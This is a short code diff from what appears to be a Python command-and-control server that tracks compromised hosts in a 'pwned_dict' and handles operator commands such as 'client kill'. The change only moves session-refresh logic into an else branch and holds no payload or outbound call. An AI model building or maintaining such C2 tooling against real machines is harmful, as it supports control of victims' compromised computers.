@@ -112,10 +112,10 @@ class C2Handler(BaseHTTPRequestHandler):
                 except BrokenPipeError:
                     print(f"{client_account}@{client_hostname} has disconnected!\n")
                     get_new_session()
-
-                # If we have just killed a client, try to get a new session to set active
-                if command.startswith("client kill"):
-                    get_new_session()
+                else:
+                    # If we have just killed a client, try to get a new session to set active
+                    if command.startswith("client kill"):
+                        get_new_session()
 
             # The client is in pwned_dict, but it is not our active session:
             else:
